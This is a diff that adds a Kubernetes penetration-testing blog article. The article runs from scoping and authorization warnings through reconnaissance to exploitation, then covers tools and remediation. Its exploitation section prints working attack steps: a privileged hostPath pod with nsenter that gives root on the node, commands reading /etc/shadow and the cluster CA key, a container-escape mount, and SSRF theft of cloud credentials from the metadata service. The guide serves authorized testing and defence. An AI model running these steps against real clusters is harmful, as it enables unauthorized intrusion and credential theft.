@@ -1,0 +1,340 @@
+---
+title: "Kubernetes Penetration Testing Guide"
+slug: kubernetes-penetration-testing
+description: "A practical guide to pentesting Kubernetes clusters — from reconnaissance to exploitation and remediation."
+date: "2025-12-28"
+author: activenerds-team
+category: devsecops-security
+tags: ["devsecops", "kubernetes"]
+featured: false
+relatedArticles: ["kubernetes-rbac-configuration", "threat-modeling-cloud-workloads", "compliance-automation-kubernetes", "devsecops-hardening-checklist", "kubernetes-network-security-policies"]
+image: https://cdn.activenerds.com/images/posts/kubernetes-penetration-testing.png
+imageAlt: "Kubernetes penetration testing — offensive security assessment methodology for finding cluster vulnerabilities"
+published: true
+---
+
+<Callout variant="tip" title="Key Takeaways">
+- **Scope carefully**: K8s pentesting without authorization is illegal
+- **Start with recon**: API discovery and RBAC enumeration reveal the most
+- **Test escalation paths**: `create pods` is the most dangerous permission
+- **Use automated tools**: kube-hunter and Popeye for broad coverage
+- **Remediate by priority**: fix criticals first, then high, then medium
+</Callout>
+
+Penetration testing a [Kubernetes cluster](/articles/kubernetes-cluster-backup-disaster-recovery) is different from traditional app pentesting. The attack surface includes the control plane, the container runtime, network policies, RBAC, and the applications running inside. This guide walks through a practical K8s pentesting methodology — from scoping to exploitation to reporting.
+
+## Scoping a K8s Pentest
+
+### What to Test
+
+A K8s pentest typically covers:
+
+- **API server exposure** — is the API server reachable? Is authentication required?
+- **[RBAC configuration](/articles/kubernetes-rbac-configuration)** — can you escalate privileges? Access other namespaces?
+- **Container isolation** — can you escape a container to the host?
+- **Network policies** — can pods reach each other across namespaces?
+- **Secrets management** — are secrets accessible to unauthorized pods?
+- **Supply chain** — can you inject malicious images or configurations?
+- **Application layer** — standard web app vulnerabilities in the deployed services
+
+### Rules of Engagement
+
+Before testing, establish clear rules:
+
+- **Cluster access level**: Do you start with no access, with a developer's kubeconfig, or with a compromised pod?
+- **Scope**: Which namespaces are in scope? Is production off-limits?
+- **Time window**: When can testing occur? Avoid peak traffic hours.
+- **Impact tolerance**: Are destructive tests (resource exhaustion, pod deletion) allowed?
+- **Notification**: Who needs to be notified before, during, and after testing?
+
+<Warning>
+Penetration testing without explicit written authorization is illegal. Always have a signed scope document before testing. Even with authorization, avoid actions that could cause data loss or prolonged downtime.
+</Warning>
+
+### Cluster Access Levels
+
+Different pentest scenarios start with different access levels:
+
+1. **Black box** — no credentials, test from outside the cluster
+2. **Gray box** — a developer's kubeconfig with limited RBAC
+3. **White box** — full documentation and a compromised pod to start from
+4. **Red team** — simulate a real attacker with only publicly available information
+
+## Reconnaissance Phase
+
+### API Discovery
+
+If the API server is exposed, test for anonymous access:
+
+```bash
+# Check if API server is reachable
+curl -k https://<cluster-ip>:6443/api/v1
+
+# Check for anonymous access
+curl -k https://<cluster-ip>:6443/api/v1/namespaces
+
+# Check API server version
+curl -k https://<cluster-ip>:6443/version
+```
+
+If anonymous access returns data, you've found a critical misconfiguration.
+
+### RBAC Enumeration
+
+With a kubeconfig or token, enumerate what you can access:
+
+```bash
+# What can I do?
+kubectl auth can-i --list
+
+# Can I list pods across all namespaces?
+kubectl auth can-i list pods --all-namespaces
+
+# Can I create pods?
+kubectl auth can-i create pods
+
+# Can I exec into pods?
+kubectl auth can-i create pods/exec
+
+# Can I access secrets?
+kubectl auth can-i get secrets --all-namespaces
+```
+
+Key escalation paths to look for:
+
+- `create pods` — you can create a pod with a hostPath mount to read host files
+- `create pods/exec` — you can exec into any pod you can access
+- `get secrets` — you can read all secrets, including service account tokens
+- `create pods/portforward` — you can port-forward to internal services
+
+### Network Mapping
+
+From inside a compromised pod, map the network:
+
+```bash
+# What services exist?
+kubectl get services -A  # If you have permission
+
+# DNS enumeration
+nslookup kubernetes.default.svc
+for i in $(seq 1 254); do nslookup 10.0.0.$i 2>/dev/null | grep -A1 "name:"; done
+
+# Scan common ports
+nmap -sT -p 80,443,5432,6379,9200,10250 10.0.0.0/24
+
+# Check if you can reach the metadata service
+curl http://169.254.169.254/latest/meta-data/
+```
+
+## Exploitation Techniques
+
+### Privilege Escalation
+
+If you have `create pods` permission, you can escalate to cluster-admin:
+
+```yaml
+# Malicious pod that mounts the host filesystem
+apiVersion: v1
+kind: Pod
+metadata:
+  name: privesc
+spec:
+  hostPID: true
+  hostNetwork: true
+  containers:
+  - name: privesc
+    image: alpine
+    securityContext:
+      privileged: true
+    command: ["nsenter", "--target", "1", "--mount", "--uts", "--ipc", "--net", "--pid", "--", "bash"]
+    volumeMounts:
+    - mountPath: /host
+      name: host
+  volumes:
+  - name: host
+    hostPath:
+      path: /
+```
+
+```bash
+# Create the pod and exec in
+kubectl apply -f privesc-pod.yaml
+kubectl exec -it privesc -- bash
+
+# You now have root access to the host node
+cat /host/etc/shadow
+cat /host/etc/kubernetes/pki/ca.crt
+```
+
+### Container Escape
+
+If you're inside a privileged container, escape is straightforward:
+
+```bash
+# Check if container is privileged
+cat /proc/1/status | grep CapEff
+# If CapEff is 0000003fffffffff, you're privileged
+
+# Mount the host filesystem
+mkdir /host
+mount /dev/sda1 /host  # Or use nsenter as above
+
+# Access host secrets
+ls /host/etc/kubernetes/
+cat /host/etc/kubernetes/pki/ca.key
+```
+
+### SSRF to Metadata
+
+If an application inside a pod is vulnerable to SSRF:
+
+```bash
+# Exploit SSRF to reach cloud metadata service
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
+# Returns: role-name
+
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name
+# Returns: AWS access key and secret key
+
+# Use the credentials to access cloud resources
+export AWS_ACCESS_KEY_ID=AKIA...
+export AWS_SECRET_ACCESS_KEY=...
+aws s3 ls
+```
+
+<Callout type="warning">
+The SSRF-to-metadata attack was the root cause of the Capital One breach in 2019. If your pods can reach 169.254.169.254, this is a critical finding. Block it with network policies.
+</Callout>
+
+## Tools and Frameworks
+
+### kube-hunter
+
+Automated vulnerability scanner for K8s clusters:
+
+```bash
+# Run from outside the cluster (black box)
+kube-hunter --remote <cluster-ip>
+
+# Run from inside a pod (gray box)
+kube-hunter --pod
+
+# Run specific hunting
+kube-hunter --active-hunt --remote <cluster-ip>
+```
+
+kube-hunter checks for:
+- Exposed API server
+- Anonymous authentication
+- Kubelet API exposure (port 10250)
+- Dashboard without authentication
+- Privileged containers
+
+### Popeye
+
+Audits cluster configuration for security issues:
+
+```bash
+# Scan the cluster
+popeye --namespace production
+
+# Save report
+popeye --namespace production --save -f json > popeye-report.json
+
+# Scan specific resources
+popeye --namespace production --resource pods,deployments,services
+```
+
+Popeye checks for:
+- Pod security issues (privileged, no resource limits)
+- RBAC misconfigurations
+- Exposed services
+- Unused resources
+- Missing network policies
+
+### Custom Scripts
+
+For targeted testing, custom scripts are often necessary:
+
+```bash
+#!/bin/bash
+# Enumerate all secrets accessible to current service account
+echo "=== Accessible Secrets ==="
+for ns in $(kubectl get namespaces -o jsonpath='{.items[*].metadata.name}'); do
+  if kubectl auth can-i get secrets -n "$ns" 2>/dev/null | grep -q yes; then
+    echo "Namespace: $ns"
+    kubectl get secrets -n "$ns" -o json | jq '.items[].metadata.name'
+  fi
+done
+
+# Check for pods with hostPath mounts
+echo "=== Pods with hostPath ==="
+kubectl get pods -A -o json | jq '.items[] | select(.spec.volumes[]?.hostPath) | .metadata.namespace + "/" + .metadata.name'
+
+# Check for privileged containers
+echo "=== Privileged containers ==="
+kubectl get pods -A -o json | jq '.items[] | select(.spec.containers[].securityContext.privileged == true) | .metadata.namespace + "/" + .metadata.name'
+```
+
+## Reporting and Remediation
+
+### Finding Severity
+
+Classify findings by severity:
+
+| Severity | Criteria | Example |
+|----------|----------|---------|
+| Critical | Immediate cluster compromise | Anonymous API access, exposed kubelet |
+| High | Privilege escalation possible | create pods permission, privileged containers |
+| Medium | Data exposure or lateral movement | Missing network policies, accessible secrets |
+| Low | Configuration weakness | Missing resource limits, no audit logging |
+| Info | Best practice recommendation | Using :latest tags, no pod disruption budgets |
+
+### Remediation Roadmap
+
+Prioritize remediation by severity and effort:
+
+```text
+Week 1 (Critical):
+- Fix anonymous API access
+- Secure kubelet API (port 10250)
+- Block metadata service access
+
+Week 2 (High):
+- Fix RBAC misconfigurations
+- Remove privileged containers
+- Enforce Pod Security Standards
+
+Week 3 (Medium):
+- Implement network policies
+- Secure secrets management
+- Add runtime security (Falco/Tetragon)
+
+Week 4 (Low/Info):
+- Add resource limits
+- Enable audit logging
+- Pin image digests
+```
+
+### Verification Retest
+
+After remediation, retest to verify fixes:
+
+```bash
+# Rerun automated scanners
+kube-hunter --remote <cluster-ip>
+popeye --namespace production
+
+# Manually verify critical findings are resolved
+kubectl auth can-i --list  # Should show reduced permissions
+kubectl get pods -A -o json | jq '.items[] | select(.spec.containers[].securityContext.privileged == true)'  # Should return empty
+```
+
+<Callout type="tip">
+**Movement break:** Pentesting is high-intensity cognitive work. After each phase (recon, exploitation, reporting), take a 10-minute walk. You'll spot findings you missed and avoid the tunnel vision that comes from hours of focused testing.
+</Callout>
+
+## Summary & Next Steps
+
+K8s pentesting is a specialized skill that combines infrastructure knowledge with offensive security techniques. If you're new to it, start with kube-hunter on a test cluster and work through the findings. For defensive guidance, see our [hardening checklist](/blog/devsecops-hardening-checklist) and [threat modeling guide](/blog/threat-modeling-cloud-workloads).
+
